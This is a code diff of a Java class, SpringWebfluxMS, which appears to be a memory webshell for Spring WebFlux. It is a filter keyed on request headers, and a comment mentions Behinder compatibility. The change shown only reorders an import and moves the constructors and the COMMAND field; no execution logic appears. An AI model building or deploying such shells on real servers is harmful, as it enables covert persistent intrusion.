@@ -4,13 +4,12 @@ import org.springframework.core.io.buffer.DefaultDataBuffer;
 import org.springframework.core.io.buffer.DefaultDataBufferFactory;
 import org.springframework.util.MultiValueMap;
 import org.springframework.web.server.ServerWebExchange;
+import org.springframework.web.server.WebFilter;
 import org.springframework.web.server.WebFilterChain;
 import org.springframework.web.server.WebHandler;
 import org.springframework.web.server.handler.DefaultWebFilterChain;
 import org.springframework.web.server.handler.FilteringWebHandler;
 import reactor.core.publisher.Mono;
-
-import org.springframework.web.server.WebFilter;
 
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
@@ -27,21 +26,9 @@ import java.util.function.Function;
  * 暂未适配冰蝎及 gzraw
  */
 public class SpringWebfluxMS implements WebFilter, Function<MultiValueMap<String, String>, Mono<DefaultDataBuffer>> {
-    public SpringWebfluxMS() {
-    }
-
-    public SpringWebfluxMS(String COMMAND) {
-        this.COMMAND = COMMAND;
-    }
-
     public static String HEADER_KEY;
-
     public static String HEADER_VALUE;
-
-    String COMMAND;
-
     public static String CMD_HEADER;
-
     public static Map<String, Object> store = new HashMap<String, Object>();
 
     static {
@@ -94,6 +81,15 @@ public class SpringWebfluxMS implements WebFilter, Function<MultiValueMap<String
             } catch (Exception ignored) {
             }
         }
+    }
+
+    String COMMAND;
+
+    public SpringWebfluxMS() {
+    }
+
+    public SpringWebfluxMS(String COMMAND) {
+        this.COMMAND = COMMAND;
     }
 
     public static Object getFieldValue(Object obj, String fieldName) throws Exception {
